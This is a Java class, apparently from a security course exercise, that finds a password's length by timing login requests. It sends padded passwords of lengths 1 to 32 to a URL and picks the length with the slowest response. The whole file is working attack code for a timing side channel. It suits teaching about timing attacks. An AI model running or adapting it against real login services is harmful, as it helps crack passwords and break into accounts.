import java.util.ArrayList;
import java.util.Collections;

public class CheckPasswordLength {

    private String baseUrl;
    private String username;
    private ArrayList<Double> timeMeasurements;
    private final int maxLength = 32;
    int difficulty;

    public CheckPasswordLength(String baseUrl, String username, int difficulty) {
        this.baseUrl = baseUrl;
        this.username = username;
        this.difficulty = difficulty;

    }

    private String createUrl(String baseUrl, String username, String password){
        String url_format = baseUrl + "?user=%s&password=%s&difficulty=%d";
        String url = String.format(url_format,username, password, difficulty);
        return url;
    }

    /**
     * this function try different lengths and measure their connections to the site
     * fill the ArrayList with sum of times off all length
     */
    public void measureConnectionWithDifferentLength(){
        timeMeasurements = new ArrayList<>();
        timeMeasurements.add(0.0);
        String password = "a";
        for (int i=1; i<=maxLength; i++){
            String url = createUrl(this.baseUrl, this.username, password);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMinimum();
            System.out.println("total time for length " +i+ " is " + time);
            timeMeasurements.add(time);
            password+="a";
        }
    }


    /**
     * method to get the length of the password.
     * @return the index of max value in timeMeasurements array ==> the length of the password.
     */
    public int getLength(){
        System.out.println("--------all measurements of password length: -----------------");
        for (double d: timeMeasurements){
            System.out.println(d);
        }
        double maxValue=  Collections.max(timeMeasurements);
        System.out.println("The max time of measurement is "+maxValue );
        return timeMeasurements.indexOf(maxValue);
    }


}
